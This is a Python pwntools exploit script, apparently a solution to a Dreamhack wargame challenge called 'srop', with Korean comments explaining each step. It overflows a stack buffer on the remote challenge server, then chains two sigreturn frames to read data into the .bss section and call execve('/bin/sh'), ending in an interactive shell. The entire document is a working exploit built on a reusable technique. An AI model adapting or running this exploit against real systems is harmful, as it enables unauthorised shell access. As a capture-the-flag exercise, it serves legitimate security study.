from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'
p = remote("host3.dreamhack.games", '20049')
elf = ELF('./srop')


gadget = next(elf.search(asm('pop rax; syscall')))  # 코드상에 있는 내용 사용한 것
print('gadget:', hex(gadget))
payload = b'A'*16  # BUFFER overflow
payload += b'B'*8  # SFP
payload += p64(gadget)  # return address
payload += p64(15) # sigreturn, pop rax 동작으로 rax에 채워질 값

# read(0, bss, 0x1000)  에 해당하는 gadget 생성, 충분한 길이를 위해 0x1000 byte read
# read를 한번 더 수행해서 "/bin/bash" string 을 bss 영역에 입력하기 위해 gadget 세팅
bss = elf.bss()
syscall = next(elf.search(asm('syscall')))
frame = SigreturnFrame()
frame.rdi = 0        # argv1
frame.rsi = bss      # argv2
frame.rdx = 0x1000   # argv3
frame.rax = 0        # SYS_read
frame.rip = syscall  # syscall 명령어 실행
frame.rsp = bss      # stack 주소를 bss 위치로 변경

payload += bytes(frame)  # sigcontext 값 주입

p.sendline(payload)  # overflow 유발

# execve('/bin/sh', 0, 0) 에 해당하는 gadget 생성
frame2 = SigreturnFrame()
# frame2.rdi = bss + ?  # argv1, '/bin/sh' 가 담긴 위치를 넣어야 한다.
# rsi, rdx는 default 로 0
frame2.rip = syscall  # syscall 명령어 실행
frame2.rax = 0x3b # execve 번호
frame2.rsp = bss + 0x500  # 충분한 버퍼를 두고 stack의 top을 bss 위치로 이동

rop = p64(gadget)  # sigreturn 호출하기 위한 gadget
rop += p64(15)  # RAX로 pop 될 위치에 sigreturn 번호 주입

frame2.rdi = bss + len(frame2) + len(rop)  # bss + 0x108, argv1, '/bin/sh' 가 담긴 위치. 

print('rdi:', bss, '+', len(frame2) + len(rop))
rop += bytes(frame2)  # sigcontext 값 주입
rop += b'/bin/sh\x00'

p.sendline(rop)  # 호출된 reaed(0, bss, 0x1000) 함수에 의한 입력값 입력

p.interactive()
